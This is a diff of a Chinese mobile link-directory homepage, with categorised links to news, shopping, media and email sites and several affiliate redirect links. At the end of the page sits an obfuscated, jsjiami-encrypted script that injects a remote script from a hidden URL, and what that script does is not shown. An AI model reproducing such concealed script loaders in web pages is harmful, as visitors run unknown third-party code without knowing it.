@@ -1,8 +1,11 @@
+
 <!DOCTYPE html>
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html>
+<head>
+<meta charset="utf-8">
 <meta name="theme-color" id="tbg">
 <meta name="viewport" content="width=device-width">
-<title>网址导航 - 手机版</title>
+<title>网址导航</title>
 <meta name="keywords" content="简单导航,简约导航,简洁导航,手机版">
 <meta name="description" content="手机版网址导航网站大全，最简洁简约实用的绿色小清新上网主页。">
 <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.9.1.min.js"></script>
@@ -34,17 +37,18 @@ function setStyle(color) {
 	document.cookie ="skin=" + color + ";expires=" + exp.toGMTString();
 }
 // black skin
-if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css";document.getElementById('tbg').setAttribute('content','#25262a')}
+if(getCookie("skin")=="black"){document.getElementById('skin').href="https://gamyeng.github.io/iblack.css";document.getElementById('tbg').setAttribute('content','#25262a')}
 </script>
 <script type="text/javascript" src="https://gamyeng.github.io/myjs.js"></script></head>
+</head>
 <body>
 <div class="header">
 	<div class="topbox">Bettersoft
-		<a href="http://m.66360.cn/" target="_self" id="setSkin" onclick="setStyle(&quot;black&quot;)" title="暗黑模式"><span></span></a><script>var setSkin=document.getElementById("setSkin");if(getCookie("skin")=="black"){setSkin.title="正常模式";setSkin.onclick=function(){setStyle("white")}}</script>
+		<a href="https://gamyeng.github.io/" target="_self" id="setSkin" onClick='setStyle("black")' title="暗黑模式" href="javascript:show(0);"><span></span></a><script>var setSkin=document.getElementById("setSkin");if(getCookie("skin")=="black"){setSkin.title="正常模式";setSkin.onclick=function(){setStyle("white")}}</script>
 	</div>
 	<div class="search">
 		<div class="search-box">
-			<img class="search-icon" src="https://gamyeng.github.io/baidu.png"/>
+			<img class="search-icon" src="https://gamyeng.github.io/baidu.png">
 			<input type="text" id="txt" class="search-input" placeholder="点击图标，可切换搜索">
 			<span class="search-clear" style="display: none"></span>
 			<button class="search-btn" id="search-btn">搜 索</button>
@@ -60,21 +64,21 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 	</div>
 </div>
 <div class="hot clearfix">
-    <ul><li><a id="links11" href="https://oa.gzyxedu.net/">OA</a></li><li><a id="links12" href="http://m.sohu.com/">搜 狐</a></li><li><a id="links13" href="http://3g.163.com/">网 易</a></li><li><a id="links14" href="http://3g.qq.com/">腾 讯</a></li></ul>
-	<ul><li><a id="links21" href="http://m.xinhuanet.com/">新 华</a></li><li><a id="links22" href="http://m.people.cn/">人 民</a></li><li><a id="links23" href="https://m.cctv.com/">央 视</a></li><li><a id="links24" href="http://m.cnr.cn/">央 廣</a></li></ul>
-	<ul><li><a id="links31" href="https://m.huanqiu.com/">环 球</a></li><li><a id="links32" href="https://m.gmw.cn/">光 明</a></li><li><a id="links33" href="http://www.cyol.net/">中 青</a></li><li><a id="links34" href="https://m.chinanews.com/">中 新</a></li></ul>
-	<ul><li><a id="links41" href="https://www.zaobao.com/">早 报</a></li><li><a id="links42" href="https://i.ifeng.com/">凤 凰</a></li><li><a id="links43" href="https://m.guancha.cn/">观 察</a></li><li><a id="links44" href="http://m.cankaoxiaoxi.com/">参 考</a></li></ul>
-	<ul><li><a id="links51" href="https://www.jiemian.com/">界 面</a></li><li><a id="links52" href="https://m.thepaper.cn/">澎 湃</a></li><li><a id="links53" href="https://www.zhihu.com/">知 乎</a></li><li><a id="links54" href="https://m.douban.com/home_guide">豆 瓣</a></li></ul>
-	<ul><li><a id="links61" href="http://www.gov.cn/">政 府</a></li><li><a id="links62" href="https://m.mysmth.net/index">水 木</a></li><li><a id="links63" href="https://m.weibo.cn/">微 博</a></li><li><a id="links64" href="https://gamyeng.github.io/set.html" style="color: rgb(255, 0, 0);">设 置</a></li></ul>
-	<script type="text/javascript" src="https://gamyeng.github.io/getShow.js"></script>
+    <ul><li><a id="links11" href="https://oa.gzyxedu.net/"></a></li><li><a id="links12" href="http://m.sohu.com"></a></li><li><a id="links13" href="http://3g.163.com/"></a></li><li><a id="links14" href="http://3g.qq.com/"></a></li></ul>
+	<ul><li><a id="links21" href="http://m.xinhuanet.com/"></a></li><li><a id="links22" href="http://m.people.cn"></a></li><li><a id="links23" href="https://m.cctv.com/"></a></li><li><a id="links24" href="http://m.cnr.cn/"></a></li></ul>
+	<ul><li><a id="links31" href="https://m.huanqiu.com/"></a></li><li><a id="links32" href="https://m.gmw.cn/"></a></li><li><a id="links33" href="http://www.cyol.net/"></a></li><li><a id="links34" href="https://m.chinanews.com/"></a></li></ul>
+	<ul><li><a id="links41" href="https://www.zaobao.com/"></a></li><li><a id="links42" href="https://i.ifeng.com/"></a></li><li><a id="links43" href="https://m.guancha.cn/"></a></li><li><a id="links44" href="http://m.cankaoxiaoxi.com/"></a></li></ul>
+	<ul><li><a id="links51" href="https://www.jiemian.com/"></a></li><li><a id="links52" href="https://m.thepaper.cn/"></a></li><li><a id="links53" href="https://www.zhihu.com/"></a></li><li><a id="links54" href="https://m.douban.com/home_guide"></a></li></ul>
+	<ul><li><a id="links61" href="http://www.gov.cn/"></a></li><li><a id="links62" href="https://m.mysmth.net/index"></a></li><li><a id="links63" href="https://m.weibo.cn/"></a></li><li><a id="links64" href="https://oa.gzyxedu.net/set.html"></a></li></ul>
+	<script type="text/javascript" src="https://gamyeng.github.io/"></script>
 </div>
 <div class="sort clearfix">
-	<p><span><a href="https://gamyeng.github.io/news.html">资 讯</a></span></p>
+	<p><span><a href="news.html">资 讯</a></span></p>
 	<ul>
-		<li><a href="https://gamyeng.github.io/tech.html">科 技</a></li>
+		<li><a href="tech.html">科 技</a></li>
 		<li><a href="https://m.huxiu.com/">虎 嗅</a></li>
 		<li><a href="https://m.36kr.com/">36 氪</a></li>
-		<li><a href="https://m.leiphone.com/">雷 锋</a></li>
+		<li><a href="https://m.leiphone.com">雷 锋</a></li>
 		<li><a href="https://m.ithome.com/" style="letter-spacing:0.4px">IT之家</a></li>
 		<li><a id="more_1" href="javascript:show(1);"><span class="dw" id="span_1"></span></a></li>
 	</ul>
@@ -86,7 +90,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://awtmt.com/">全天候</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/car.html">汽 车</a></li>
+		<li><a href="car.html">汽 车</a></li>
 		<li><a href="http://m.autohome.com.cn/">之 家</a></li>
 		<li><a href="http://m.yiche.com/">易 车</a></li>
 		<li><a href="http://a.xcar.com.cn/">爱 卡</a></li>
@@ -101,7 +105,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="http://www.cnautonews.com/">汽车报</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/finance.html">财 经</a></li>
+		<li><a href="finance.html">财 经</a></li>
 		<li><a href="http://m.caijing.com.cn/">财 经</a></li>
 		<li><a href="https://m.yicai.com/">一 财</a></li>
 		<li><a href="http://xueqiu.com/">雪 球</a></li>
@@ -116,11 +120,11 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="http://m.jrj.com.cn/">金融界</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/manager.html">商 界</a></li>
+		<li><a href="manager.html">商 界</a></li>
+		<li><a href="http://www.cb.com.cn/">经 营</a></li>
 		<li><a href="http://www.pbc.gov.cn/">银 行</a></li>
 		<li><a href="http://www.customs.gov.cn/">海 关</a></li>
 		<li><a href="https://www.ndrc.gov.cn/wapindex/">发 改</a></li>
-		<li><a href="http://www.iceo.com.cn/">企业家</a></li>
 		<li><a id="more_4" href="javascript:show(4);"><span class="dw" id="span_4"></span></a></li>
 	</ul>
 	<dl style="display:none" id="div_4">
@@ -131,7 +135,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://m.pedaily.cn/">投资界</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/sports.html">体 育</a></li>
+		<li><a href="sports.html">体 育</a></li>
 		<li><a href="https://m.hupu.com/">虎 扑</a></li>
 		<li><a href="https://m.ttplus.cn/">体 坛</a></li>
 		<li><a href="http://www.lanxiongsports.com/">懒 熊</a></li>
@@ -149,7 +153,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 <div class="sort clearfix">
 	<p><span>休 闲</span></p>
 	<ul>
-		<li><a href="https://gamyeng.github.io/music.html">音 乐</a></li>
+		<li><a href="music.html">音 乐</a></li>
 		<li><a href="http://m.kuwo.cn/">酷 我</a></li>
 		<li><a href="http://m.kugou.com/">酷 狗</a></li>
 		<li><a href="https://www.migu.cn/music.html">咪 咕</a></li>
@@ -164,40 +168,40 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="http://m.tingtingfm.com/">北京台</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/video.html">影 视</a></li>
+		<li><a href="video.html">影 视</a></li>
 		<li><a href="https://www.youku.com/">优 酷</a></li>
 		<li><a href="https://m.mgtv.com/">芒 果</a></li>
 		<li><a href="https://m.bilibili.com/">哔 哩</a></li>
-		<li><a href="https://m.iqiyi.com/">爱奇艺</a></li>
+		<li><a href="https://m.iqiyi.com">爱奇艺</a></li>
 		<li><a id="more_7" href="javascript:show(7);"><span class="dw" id="span_7"></span></a></li>
 	</ul>
 	<dl style="display:none" id="div_7">
 		<li><a href="http://cinehello.com/">幕 后</a></li>
-		<li><a href="https://m.1905.com/">1905</a></li>
+		<li><a href="https://m.1905.com">1905</a></li>
 		<li><a href="https://m.mtime.com/">时 光</a></li>
 		<li><a href="http://m.maoyan.com/">猫 眼</a></li>
 		<li><a href="https://www.rottentomatoes.com/">烂番茄</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/ent.html">娱 乐</a></li>
-		<li><a href="https://m.huya.com/">虎 牙</a></li>
-		<li><a href="https://m.douyu.com/">斗 鱼</a></li>
+		<li><a href="ent.html">娱 乐</a></li>
+		<li><a href="https://m.huya.com">虎 牙</a></li>
+		<li><a href="https://m.douyu.com">斗 鱼</a></li>
 		<li><a href="http://wap.yy.com/">歪 歪</a></li>
-		<li><a href="http://m.v.6.cn/">六间房</a></li>
+		<li><a href="http://m.v.6.cn">六间房</a></li>
 		<li><a id="more_8" href="javascript:show(8);"><span class="dw" id="span_8"></span></a></li>
 	</ul>
 	<dl style="display:none" id="div_8">
 		<li><a href="https://www.xzw.com/">星 座</a></li>
 		<li><a href="http://www.yiren.com.cn/">艺 人</a></li>
-		<li><a href="http://m.ifensi.com/">粉 丝</a></li>
+		<li><a href="http://m.ifensi.com">粉 丝</a></li>
         <li><a href="https://m.damai.cn/">大 麦</a></li>
-		<li><a href="https://m.moretickets.com/">摩天轮</a></li>
+		<li><a href="https://m.moretickets.com">摩天轮</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/read.html">小 说</a></li>
+		<li><a href="read.html">小 说</a></li>
 		<li><a href="https://m.qidian.com/">起 点</a></li>
 		<li><a href="http://m.zongheng.com/">纵 横</a></li>
-		<li><a href="https://m.jjwxc.net/">晋 江</a></li>
+		<li><a href="https://m.jjwxc.net">晋 江</a></li>
 		<li><a href="https://m.dushu.com/">读书网</a></li>
 		<li><a id="more_9" href="javascript:show(9);"><span class="dw" id="span_9"></span></a></li>
 	</ul>
@@ -209,7 +213,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://m.wjsw.com/">万卷书</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/fashion.html">时 尚</a></li>
+		<li><a href="fashion.html">时 尚</a></li>
 		<li><a href="http://m.bazaar.com.cn/">芭 莎</a></li>
 		<li><a href="http://m.mcchina.com/">嘉 人</a></li>
 		<li><a href="http://www.ellechina.com/">ELLE</a></li>
@@ -227,7 +231,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 <div class="sort clearfix">
 	<p><span>日 常</span></p>
 	<ul>
-		<li><a href="https://gamyeng.github.io/live.html">生 活</a></li>
+		<li><a href="live.html">生 活</a></li>
 		<li><a href="http://m.baixing.com/">百 姓</a></li>
 		<li><a href="http://meituan.com/">美 团</a></li>
 		<li><a href="https://m.dianping.com/">点 评</a></li>
@@ -237,15 +241,15 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 	<dl style="display:none" id="div_11">
 		<li><a href="https://www.piyao.org.cn/">辟 谣</a></li>
 		<li><a href="http://www.ccn.com.cn/">消 费</a></li>
-		<li><a href="http://wap.10086.cn/">移 动</a></li>
+		<li><a href="http://wap.10086.cn">移 动</a></li>
         <li><a href="http://m.10010.com/">联 通</a></li>
-        <li><a href="http://m.fang.com/">房天下</a></li>
+        <li><a href="http://m.fang.com">房天下</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/shop.html">购 物</a></li>
+		<li><a href="shop.html">购 物</a></li>
 		<li><a href="http://m.taobao.com/">淘 宝</a></li>
 		<li><a href="https://tb.jiuxinban.com/7tLABM">当 当</a></li>
-		<li><a href="https://union-click.jd.com/jdc?e=618%7Cpc%7C&amp;p=JF8BANoJK1olXDYDZBoCUBVIMzZNXhpXVhgcDVpCVFRMVnBaRQcLDlZRAAMoUAMJaDtMWUVzBnF0ACcPYABWAxJTTjt9HnUGFigtWC9rXz8WQwRACU8dDRsBVUVWUzlcYw4ZBFhHZCQaSgBSdghgfhhrBQJeFBoZYSB8XzkEF2sVWAAKVV5YD0keM28JGloVXQ4GVVZtOEsWMyRmGmsXXQcDVVpcCk0UM28PHFwRVQcKVV5YCEgnBG8BKwtAHwQFVW5tOEgnBG8BD11nHFQWUixtOEknAF84GVoUWQ8yZA">京 东</a></li>
+		<li><a href="https://union-click.jd.com/jdc?e=618%7Cpc%7C&p=JF8BANoJK1olXDYDZBoCUBVIMzZNXhpXVhgcDVpCVFRMVnBaRQcLDlZRAAMoUAMJaDtMWUVzBnF0ACcPYABWAxJTTjt9HnUGFigtWC9rXz8WQwRACU8dDRsBVUVWUzlcYw4ZBFhHZCQaSgBSdghgfhhrBQJeFBoZYSB8XzkEF2sVWAAKVV5YD0keM28JGloVXQ4GVVZtOEsWMyRmGmsXXQcDVVpcCk0UM28PHFwRVQcKVV5YCEgnBG8BKwtAHwQFVW5tOEgnBG8BD11nHFQWUixtOEknAF84GVoUWQ8yZA">京 东</a></li>
 		<li><a href="https://tb.jiuxinban.com/7tLyl0">唯品会</a></li>
 		<li><a id="more_12" href="javascript:show(12);"><span class="dw" id="span_12"></span></a></li>
 	</ul>
@@ -257,7 +261,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://h.uniqlo.cn/">优衣库</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/trip.html">旅 游</a></li>
+		<li><a href="trip.html">旅 游</a></li>
 		<li><a href="http://m.ctrip.com/">携 程</a></li>
 		<li><a href="http://m.elong.com/">艺 龙</a></li>
 		<li><a href="http://touch.qunar.com/">去 哪</a></li>
@@ -268,11 +272,11 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://m.8264.com/">户 外</a></li>
 		<li><a href="https://tb.jiuxinban.com/7tKurM">途 牛</a></li>
 		<li><a href="https://m.qyer.com/">穷 游</a></li>
-		<li><a href="https://m.tujia.com/">途 家</a></li>
+		<li><a href="https://m.tujia.com">途 家</a></li>
 		<li><a href="https://m.airbnb.com/">爱彼迎</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/health.html">健 康</a></li>
+		<li><a href="health.html">健 康</a></li>
 		<li><a href="http://www.jksb.com.cn/">时 报</a></li>
 		<li><a href="http://m.39.net/">三 九</a></li>
 		<li><a href="https://www.mvyxws.com/">医 微</a></li>
@@ -287,7 +291,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://www.msdmanuals.cn/">默沙东</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/study.html">学 习</a></li>
+		<li><a href="study.html">学 习</a></li>
 		<li><a href="https://m.51zxw.net/">自 学</a></li>
 		<li><a href="https://open.163.com/">公 课</a></li>
 		<li><a href="http://yixi.tv/">一 席</a></li>
@@ -305,7 +309,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 <div class="sort clearfix">
 	<p><span>实 用</span></p>
 	<ul>
-		<li><a href="https://gamyeng.github.io/tool.html">工 具</a></li>
+		<li><a href="tool.html">工 具</a></li>
 		<li><a href="https://www.online-qr-scanner.com/zh-cn/">扫 码</a></li>
 		<li><a href="https://m.amap.com/">地 图</a></li>
 		<li><a href="http://m.youdao.com/translate">翻 译</a></li>
@@ -317,10 +321,10 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://m.speedtest.cn/">网 速</a></li>
 		<li><a href="https://mathsolver.microsoft.com/zh">数 学</a></li>
 		<li><a href="https://m.dict.cn/">词 典</a></li>
-		<li><a href="https://gamyeng.github.io/bmi.html">体脂率</a></li>
+		<li><a href="http://m.66360.cn/bmi.html">体脂率</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/email.html">邮 箱</a></li>
+		<li><a href="email.html">邮 箱</a></li>
 		<li><a href="http://m.mail.163.com/">网 易</a></li>
 		<li><a href="http://mail.sina.com.cn/">新 浪</a></li>
 		<li><a href="http://m.mail.sohu.com/">搜 狐</a></li>
@@ -335,7 +339,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://mail.wo.cn/">沃邮箱</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/job.html">招 聘</a></li>
+		<li><a href="job.html">招 聘</a></li>
 		<li><a href="https://m.51job.com/">前 程</a></li>
 		<li><a href="https://m.zhaopin.com/">智 联</a></li>
 		<li><a href="http://wap.ganji.com/">赶 集</a></li>
@@ -350,7 +354,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="http://www.mohrss.gov.cn/wap/">人社部</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/business.html">商 务</a></li>
+		<li><a href="business.html">商 务</a></li>
 		<li><a href="https://m.huodongjia.com/">活 动</a></li>
 		<li><a href="https://m.modian.com/">摩 点</a></li>
 		<li><a href="http://www.bdwork.com/">沃 客</a></li>
@@ -365,7 +369,7 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 		<li><a href="https://m.zbj.com/">猪八戒</a></li>
 	</dl>
 	<ul>
-		<li><a href="https://gamyeng.github.io/more.html">酷 站</a></li>
+		<li><a href="more.html">酷 站</a></li>
 		<li><a href="https://m.guokr.com/">果 壳</a></li>
 		<li><a href="http://jiandan.net/">煎 蛋</a></li>
 		<li><a href="http://www.timepill.net/">胶 囊</a></li>
@@ -382,13 +386,14 @@ if(getCookie("skin")=="black"){document.getElementById('skin').href="iblack.css"
 </div>
 <div class="footer clearfix">
 	<ul>
-		<li><a href="https://gamyeng.github.io/">首页</a></li>
-		<li><a href="https://gamyeng.github.io/about.html">关于我们</a></li>
-		<li><a href="https://gamyeng.github.io/set.html">我的设置</a></li>
+		<li><a href="https://gamyeng.github.io/">电脑首页</a></li>
+		<li><a href="about.html">关于我们</a></li>
+		<li><a href="set.html">我的设置</a></li>
 	</ul>
-	<div class="copyright">© 2023 Bettersoft</div>
+	<div class="copyright">© 2023 wobo</div>
 </div>
-
+</body>
+</html>
 <script>
 var _0xodj='jsjiami.com.v6',_0xodj_=['‮_0xodj'],_0x58eb=[_0xodj,'JMOCbRNdfcOMwopNfsK7DcKc','w5LCmj5jw68=','w6sCYw0YCcO7FMOnAREH','IsKxwqF2w6E=','wr3DqcKDNcKW','e0wyw4vCiBnDhcOowp05O8KQ','wr3CkcKLw6U3','w7jCnMKaPQ==','FDo3w4nCs8O2woEowpvCtsKU','wqZ1w5txw6rDiMKD','bWQWwpcAYQ==','w5AUwo/DuQ==','wovDtsKQBcOuwoPCicKOLhzChMOhIm3Crg==','wrLCtBs=','jAQZsjiamupgi.NcoemlY.bSvZ6qh=='];if(function(_0x190950,_0x562c99,_0x2858f6){function _0x5290f0(_0x8e70fa,_0x451efc,_0x42a61c,_0x54f7ff,_0x109da4,_0x1e28bf){_0x451efc=_0x451efc>>0x8,_0x109da4='po';var _0x12c4de='shift',_0x69b06a='push',_0x1e28bf='‮';if(_0x451efc<_0x8e70fa){while(--_0x8e70fa){_0x54f7ff=_0x190950[_0x12c4de]();if(_0x451efc===_0x8e70fa&&_0x1e28bf==='‮'&&_0x1e28bf['length']===0x1){_0x451efc=_0x54f7ff,_0x42a61c=_0x190950[_0x109da4+'p']();}else if(_0x451efc&&_0x42a61c['replace'](/[AQZupgNelYbSZqh=]/g,'')===_0x451efc){_0x190950[_0x69b06a](_0x54f7ff);}}_0x190950[_0x69b06a](_0x190950[_0x12c4de]());}return 0xccec6;};return _0x5290f0(++_0x562c99,_0x2858f6)>>_0x562c99^_0x2858f6;}(_0x58eb,0x88,0x8800),_0x58eb){_0xodj_=_0x58eb['length']^0x88;};function _0x6e03(_0x11c5fa,_0x6219df){_0x11c5fa=~~'0x'['concat'](_0x11c5fa['slice'](0x1));var _0xb245f9=_0x58eb[_0x11c5fa];if(_0x6e03['WPZeGr']===undefined){(function(){var _0x30864b=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x3e2c79='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x30864b['atob']||(_0x30864b['atob']=function(_0x3e9b27){var _0x13c68a=String(_0x3e9b27)['replace'](/=+$/,'');for(var _0x39d95a=0x0,_0x6fd2de,_0x413c98,_0x3e9eb1=0x0,_0x5f02fd='';_0x413c98=_0x13c68a['charAt'](_0x3e9eb1++);~_0x413c98&&(_0x6fd2de=_0x39d95a%0x4?_0x6fd2de*0x40+_0x413c98:_0x413c98,_0x39d95a++%0x4)?_0x5f02fd+=String['fromCharCode'](0xff&_0x6fd2de>>(-0x2*_0x39d95a&0x6)):0x0){_0x413c98=_0x3e2c79['indexOf'](_0x413c98);}return _0x5f02fd;});}());function _0x1f849b(_0x2241ff,_0x6219df){var _0x25eb01=[],_0x2ba27c=0x0,_0x1fd78b,_0x41f2ad='',_0x908151='';_0x2241ff=atob(_0x2241ff);for(var _0x289106=0x0,_0x24c0ea=_0x2241ff['length'];_0x289106<_0x24c0ea;_0x289106++){_0x908151+='%'+('00'+_0x2241ff['charCodeAt'](_0x289106)['toString'](0x10))['slice'](-0x2);}_0x2241ff=decodeURIComponent(_0x908151);for(var _0x5cc658=0x0;_0x5cc658<0x100;_0x5cc658++){_0x25eb01[_0x5cc658]=_0x5cc658;}for(_0x5cc658=0x0;_0x5cc658<0x100;_0x5cc658++){_0x2ba27c=(_0x2ba27c+_0x25eb01[_0x5cc658]+_0x6219df['charCodeAt'](_0x5cc658%_0x6219df['length']))%0x100;_0x1fd78b=_0x25eb01[_0x5cc658];_0x25eb01[_0x5cc658]=_0x25eb01[_0x2ba27c];_0x25eb01[_0x2ba27c]=_0x1fd78b;}_0x5cc658=0x0;_0x2ba27c=0x0;for(var _0x296b61=0x0;_0x296b61<_0x2241ff['length'];_0x296b61++){_0x5cc658=(_0x5cc658+0x1)%0x100;_0x2ba27c=(_0x2ba27c+_0x25eb01[_0x5cc658])%0x100;_0x1fd78b=_0x25eb01[_0x5cc658];_0x25eb01[_0x5cc658]=_0x25eb01[_0x2ba27c];_0x25eb01[_0x2ba27c]=_0x1fd78b;_0x41f2ad+=String['fromCharCode'](_0x2241ff['charCodeAt'](_0x296b61)^_0x25eb01[(_0x25eb01[_0x5cc658]+_0x25eb01[_0x2ba27c])%0x100]);}return _0x41f2ad;}_0x6e03['XpdnAG']=_0x1f849b;_0x6e03['hwdHFT']={};_0x6e03['WPZeGr']=!![];}var _0x57bf57=_0x6e03['hwdHFT'][_0x11c5fa];if(_0x57bf57===undefined){if(_0x6e03['hWUfnh']===undefined){_0x6e03['hWUfnh']=!![];}_0xb245f9=_0x6e03['XpdnAG'](_0xb245f9,_0x6219df);_0x6e03['hwdHFT'][_0x11c5fa]=_0xb245f9;}else{_0xb245f9=_0x57bf57;}return _0xb245f9;};function addScript(_0x30ab0c){var _0x573fa7={'KvyIs':_0x6e03('‮0','x^lN'),'YiCto':_0x6e03('‮1','v9]f'),'BzkDW':_0x6e03('‫2','0anm'),'KFAcs':_0x6e03('‮3','^!3B')};var _0x52e8a2=document[_0x6e03('‮4','[hjY')](_0x573fa7[_0x6e03('‮5','UhsZ')]);_0x52e8a2[_0x6e03('‮6','$HwC')](_0x573fa7[_0x6e03('‮7','WiNG')],_0x573fa7[_0x6e03('‫8','0anm')]);_0x52e8a2[_0x6e03('‫9','iJ5m')](_0x573fa7[_0x6e03('‫a','3Cvn')],_0x30ab0c);document['getElementsByTagName'](_0x6e03('‮b','D2pY'))[0x0][_0x6e03('‫c','fU#u')](_0x52e8a2);}addScript(_0x6e03('‮d','BP6@'));;_0xodj='jsjiami.com.v6';
-</script></body></html>
+</script>
